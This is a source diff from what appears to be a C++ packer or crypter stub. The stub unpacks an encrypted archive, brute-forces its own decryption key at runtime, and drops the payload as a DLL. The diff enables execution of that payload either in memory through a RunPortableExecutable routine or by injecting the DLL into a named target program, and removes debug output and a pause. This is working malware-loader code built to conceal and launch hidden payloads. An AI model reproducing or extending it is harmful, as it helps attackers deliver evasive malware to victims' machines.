@@ -26,12 +26,11 @@ int unpackfiles(char *archive, char *dest, std::vector<packdata_t> &filesList, l
 int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList, long startPos, packcallbacks_t * pcb) {
 
 	FILE* fpArchive = fopen(archive, "rb");
-	
 
 	if (!fpArchive) return packerrorCouldNotOpenArchive;
 
 	char SIG[13];
-	long nFiles;
+	SIZE_T nFiles;
 
 	char TargetProgram[80];
 	int exeMethod;
@@ -45,21 +44,23 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 	fread(&END_ASCII, sizeof(END_ASCII), 1, fpArchive);
 	key = new char[KEY_SIZE]();
 
-	
 
 	// read signature
 	fread(SIG, sizeof(char), sizeof(SIG), fpArchive);
 
+
 	// read execution method
 	fread(&exeMethod, sizeof(int), 1, fpArchive);
-	printf("Retrieved exeMethod : %d\n", exeMethod);
 
 	// read targetprogram name
-	fread(TargetProgram, sizeof(char), sizeof(TargetProgram), fpArchive);
-	printf("Retrieved TargetProgram name : %s\n", TargetProgram);
-	system("PAUSE");
+	if (exeMethod != 0)
+		fread(TargetProgram, sizeof(char), sizeof(TargetProgram), fpArchive);
 
-	if (!retrieveKey(SIG, sizeof(SIG))) return (fclose(fpArchive), packerrorNotAPackedFile);
+	if (!retrieveKey(SIG, sizeof(SIG))) {
+		fclose(fpArchive);
+		return packerrorNotAPackedFile;
+	}
+		
 
 	// read files entries count
 	fread(&nFiles, sizeof(nFiles), 1, fpArchive);
@@ -74,7 +75,6 @@ int unpackfilesEx(char *archive, char *dest, std::vector<packdata_t> &filesList,
 	// loop in all files
 	for (unsigned int i = 0; i < filesList.size(); i++) {
 
-		FILE* fpOut;
 		char buffer[4096];
 		packdata_t *pdata = &filesList[i];
 
@@ -137,33 +137,12 @@ int SfxGetInsertPos(char *filename, long *pos){
 	return packerrorSuccess;
 }
 
-int SfxSetInsertPos(char *filename, long pos){
-
-	FILE *fp = fopen(filename, "rb+");
-	if (fp == NULL)
-		return packerrorCouldNotOpenArchive;
-
-	IMAGE_DOS_HEADER idh;
-
-	// read dos header
-	fread((void *)&idh, sizeof(idh), 1, fp);
-
-	// adjust position value in an unused MZ field
-	*(long *)&idh.e_res2[0] = pos;
-
-	// update header
-	rewind(fp);
-	fwrite((void *)&idh, sizeof(idh), 1, fp);
-	fclose(fp);
-	return packerrorSuccess;
-}
-
 
 bool retrieveKey(char* readSignature, int signatureSize) {
 
 	//bruteforcing the encryption key
 
-	char retrievedSig[] = "aaaaaaaaaaaaaaaaaaaaa";
+	char* retrievedSig = new char[signatureSize];
 	int i = KEY_SIZE;
 
 	for (int k = 0; k < KEY_SIZE; k++)
@@ -196,31 +175,22 @@ int RunImage(char* Image, int imSize, int exeMethod, char* targetProgram) {
 
 	LPCSTR pDllPath = "E:\\tmp.dll";
 
-
 	if (exeMethod > 0) {
+		
 		FILE* fpDll = fopen(pDllPath, "wb+");
-		char buffer[2048];
 
-		//while (imSize > 0) {
-			//long toread = imSize > sizeof(buffer) ? sizeof(buffer) : imSize;
-			//memcpy(buffer, Image, toread);
-			fwrite(Image, sizeof(char), imSize, fpDll);
-			//imSize -= toread;
-		//}
-
+		fwrite(Image, sizeof(char), imSize, fpDll);
 		fclose(fpDll);
 	}
-
-
 
 	switch (exeMethod)
 	{
 	case -1:
 		break;
 	case 0:
-		//RunPortableExecutable(Image);
+		RunPortableExecutable(Image);
 		break;
-	case 1:
+	default:
 		initializeInjection(targetProgram, pDllPath, exeMethod);
 		break;
 	}
